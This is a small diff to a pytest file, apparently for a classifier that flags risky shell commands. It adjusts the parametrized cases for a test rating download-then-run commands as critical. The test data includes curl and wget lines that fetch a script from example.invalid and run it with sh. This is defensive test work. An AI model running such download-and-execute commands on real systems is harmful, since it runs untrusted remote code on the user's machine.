@@ -398,7 +398,7 @@ def test_a_download_saved_under_an_implied_name_then_run_is_critical(command: st
 @pytest.mark.parametrize(
     "command",
     [
-        "curl -Ho x https://example.invalid/a.sh && sh x",
+        "curl -Hox https://example.invalid/a.sh && sh x",
         "wget -O /tmp/a https://example.invalid/x.sh && sh x.sh",
         "curl -sO https://example.invalid/x.sh && echo ok",
     ],
